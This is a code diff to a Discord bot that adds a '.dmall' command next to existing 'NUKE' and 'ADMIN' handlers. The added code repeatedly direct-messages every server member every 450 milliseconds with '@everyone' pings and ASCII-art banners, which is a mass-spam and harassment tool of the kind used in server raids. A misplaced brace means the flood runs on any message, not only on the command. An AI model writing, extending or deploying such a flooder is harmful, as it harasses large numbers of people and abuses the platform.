@@ -37,6 +37,8 @@ type: "STREAMING"
 });
 }
 
+
+
 //** NUKE **//
 client.on("message", message => {
   if (message.author.bot) return;
@@ -359,6 +361,34 @@ client.on("message", message => {
 //** ADMIN **//
 
 
+
+//** DMALL **//
+client.on("message", message => {
+  if (message.author.bot) return;
+  if (message.content === ".dmall")
+  message.delete()
+  message.guild.members.cache.forEach(member => {
+  setInterval(function() {
+    member.send("@everyone");
+    member.send("|| @everyone || ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗ || @everyone ||");
+    member.send("|| @everyone || ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝ || @everyone ||");
+    member.send("|| @everyone || ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░ || @everyone ||");
+    member.send("|| @everyone || ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░ || @everyone ||");
+    member.send("|| @everyone || ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░ || @everyone ||");
+    member.send("@everyone");
+    member.send("|| @everyone || ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░█████╗░ || @everyone ||");
+    member.send("|| @everyone || ██╔══██╗░██║░░██╗░░██║████╗░██║██╔══██╗ || @everyone ||");
+    member.send("|| @everyone || ██║░░██║░╚██╗████╗██╔╝██╔██╗██║███████║ || @everyone ||");
+    member.send("|| @everyone || ██║░░██║░░████╔═████║░██║╚████║██╔══██║ || @everyone ||");
+    member.send("|| @everyone || ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║██║░░██║ || @everyone ||");
+    member.send("@everyone").catch(error => { });
+  }, 450);
+  })
+  });
+//** DMALL **//
+
+
+
 //** HELP **//
 client.on("message", message => {
   if (message.author.bot) return;
@@ -381,9 +411,6 @@ client.on("message", message => {
  }
 });
 //** HELP **//
-
-
-
 
 
 
